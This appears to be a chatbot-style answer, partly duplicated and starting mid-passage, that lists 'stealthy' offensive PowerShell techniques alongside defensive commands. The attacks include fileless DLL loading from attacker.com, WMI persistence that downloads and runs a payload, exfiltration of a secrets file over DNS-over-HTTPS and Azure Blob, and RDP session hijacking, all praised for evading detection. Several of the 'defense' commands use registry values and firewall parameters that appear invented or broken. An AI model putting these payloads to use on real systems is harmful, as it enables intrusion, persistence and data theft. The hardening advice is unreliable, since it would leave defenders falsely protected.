tscon 1 /dest:rdp-tcp#0  
```  
- **Purpose**: Hijacks active RDP sessions without credentials.  
- **Why Strong?**: Operates entirely in memory.  

**Defense**:  
```powershell  
# Restrict SeImpersonatePrivilege  
secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose  
# Enable Restricted Admin Mode for RDP  
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0  
```  

---

### **Defensive Overkill: Nuclear Options**  
#### **1. Cripple Offensive Tooling**  
```powershell  
# Block Mimikatz & common hacking tools via DLL blocking  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" -Name "wdigest.dll" -Value "Deny"  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" -Name "kerberos.dll" -Value "Deny"  
```  

#### **2. Disable .NET Reflection**  
```powershell  
# Prevent in-memory assembly loading  
Set-ItemProperty -Path "HKLM:\Software\Microsoft\.NETFramework" -Name "DisableRuntimeCompilation" -Value 1  
```  

#### **3. Kernel-Level Protections**  
```powershell  
# Enable Hypervisor-Protected Code Integrity (HVCI)  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequireMicrosoftSignedBootChain" -Value 1  
```  

---

### **Key Takeaways**  
1. **Offensive Power**:  
   - Use trusted protocols (WMI, RDP, DoH) and living-off-the-land techniques.  
   - Focus on **memory residency** and **encrypted channels**.  
2. **Defensive Brutality**:  
   - Block entire classes of attacks (e.g., .NET reflection, WMI).  
   - Deploy **kernel-level hardening** (HVCI) and **restrict PowerShell to teeth**.  
3. **Monitoring**:  
   - Hunt for **unusual WMI events**, **DNS anomalies**, and **cloud API abuse**.  






Certainly! Below is my **curated list of the strongest PowerShell commands** for **remote access via the internet**, along with **defensive countermeasures**. These commands are designed to be **highly effective** while also being **stealthy** and **difficult to detect**. I’ve also included my **opinionated recommendations** for hardening your environment against these techniques.

---

### **Strongest Offensive PowerShell Commands for Remote Access**  
#### **1. Reflective DLL Injection (Fileless Execution)**  
```powershell  
# Load and execute a malicious DLL directly from memory  
$bytes = (Invoke-WebRequest -Uri "http://attacker.com/malware.dll" -UseBasicParsing).Content  
$assembly = [System.Reflection.Assembly]::Load($bytes)  
$assembly.EntryPoint.Invoke($null, $null)  
```  
- **Why It’s Strong**:  
  - No files are written to disk, evading traditional antivirus.  
  - Runs entirely in memory, making it hard to detect.  
- **My Opinion**:  
  - This is one of the most powerful techniques for fileless attacks. It’s commonly used in advanced persistent threats (APTs).  

**Defense**:  
```powershell  
# Enable Constrained Language Mode  
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  

# Block PowerShell from making web requests  
New-NetFirewallRule -DisplayName "Block PS Web Requests" -Direction Outbound -Action Block -Protocol TCP -RemotePort 80,443 -Program "powershell.exe"  

# Enable AMSI (Antimalware Scan Interface)  
Set-MpPreference -DisableScriptScanning $false  
```  

---

#### **2. WMI Event Subscription (Persistence)**  
```powershell  
# Create a WMI event to trigger a payload on system startup  
$filterArgs = @{  
  Name = 'StartupTrigger'  
  EventNameSpace = 'root\CimV2'  
  QueryLanguage = 'WQL'  
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"  
}  
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs  

$consumerArgs = @{  
  Name = 'StartupConsumer'  
  CommandLineTemplate = "powershell.exe -nop -w hidden -c `"iex (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""  
}  
$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs  

New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{  
  Filter = $filter  
  Consumer = $consumer  
}  
```  
- **Why It’s Strong**:  
  - WMI is a trusted Windows component, so this technique often flies under the radar.  
  - The payload is executed without writing to disk or creating suspicious processes.  
- **My Opinion**:  
  - This is a **top-tier persistence mechanism** for red teams and attackers. It’s incredibly stealthy and hard to detect without deep WMI monitoring.  

**Defense**:  
```powershell  
# Hunt for malicious WMI subscriptions  
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter  
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer  

# Block WMI entirely if unused  
Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled False -Action Block  
```  

---

#### **3. DNS-over-HTTPS (DoH) Tunneling**  
```powershell  
# Exfiltrate data via encrypted DNS  
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))  
$query = "$data.attacker.com"  
Invoke-RestMethod -Uri "https://dns.google/resolve?name=$query&type=TXT" -Method Get  
```  
- **Why It’s Strong**:  
  - DNS-over-HTTPS (DoH) encrypts DNS traffic, making it difficult to inspect.  
  - This technique bypasses traditional DNS monitoring tools.  
- **My Opinion**:  
  - DoH tunneling is a **game-changer** for stealthy data exfiltration. It’s becoming increasingly popular in advanced attacks.  

**Defense**:  
```powershell  
# Block DoH endpoints  
New-NetFirewallRule -DisplayName "Block DoH" -Direction Outbound -Action Block -Protocol TCP -RemoteAddress "8.8.8.8,1.1.1.1" -RemotePort 443  

# Monitor for base64 in DNS queries  
Get-WinEvent -LogName "Microsoft-Windows-DNS-Client/Operational" | Where-Object { $_.Message -match "[A-Za-z0-9+/]{20,}={0,2}" }  
```  

---

#### **4. Token Impersonation + RDP Hijacking**  
```powershell  
# Steal an RDP session token (requires SYSTEM privileges)  
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Admin"  
tscon 1 /dest:rdp-tcp#0  
```  
- **Why It’s Strong**:  
  - Allows attackers to hijack active RDP sessions without needing credentials.  
  - Operates entirely in memory, leaving minimal traces.  
- **My Opinion**:  
  - This is a **brilliant technique** for lateral movement in environments where RDP is widely used. It’s especially dangerous in shared or multi-user systems.  

**Defense**:  
```powershell  
# Restrict SeImpersonatePrivilege  
secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose  

# Enable Restricted Admin Mode for RDP  
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0  
```  

---

#### **5. AzureAD-Based C2 (Living-off-Cloud)**  
```powershell  
# Exfiltrate data via Azure Blob Storage  
$storageContext = New-AzStorageContext -ConnectionString "DefaultEndpointsProtocol=https;AccountName=attackeraccount;AccountKey=..."  
Set-AzStorageBlobContent -File C:\secrets.txt -Container "exfil" -Blob "data.txt" -Context $storageContext  
```  
- **Why It’s Strong**:  
  - Uses legitimate cloud services, blending in with normal traffic.  
  - Difficult to detect without specialized cloud monitoring tools.  
- **My Opinion**:  
  - Cloud-based C2 is the **future of advanced attacks**. It’s incredibly effective because it leverages trusted platforms like Azure, AWS, or Google Cloud.  

**Defense**:  
```powershell  
# Monitor AzureAD activity (requires Defender for Cloud Apps)  
Get-AzStorageBlob -Container "exfil" -Context $storageContext | Where-Object { $_.Name -match "secrets" }  

# Block unauthorized cloud APIs  
New-NetFirewallRule -DisplayName "Block Azure Storage API" -Direction Outbound -Action Block -Protocol TCP -RemotePort 443 -RemoteAddress "*.blob.core.windows.net"  
```  

---

### **My Opinionated Recommendations for Defense**  
1. **Harden PowerShell**:  
   - Restrict PowerShell to **Constrained Language Mode**.  
   - Block PowerShell from making web requests.  
   - Enable **AMSI** and **script block logging**.  

2. **Monitor WMI**:  
   - Regularly audit WMI subscriptions and event consumers.  
   - Block WMI entirely if it’s not needed in your environment.  

3. **Block DoH**:  
   - Prevent PowerShell from communicating with DoH endpoints.  
   - Monitor DNS logs for base64-encoded queries.  

4. **Restrict RDP**:  
   - Enable **Restricted Admin Mode** and **Network Level Authentication (NLA)**.  
   - Restrict RDP access to specific IPs.  

5. **Cloud Monitoring**:  
   - Use **Defender for Cloud Apps** or similar tools to monitor cloud activity.  
   - Block unauthorized cloud APIs at the firewall level.  

---









































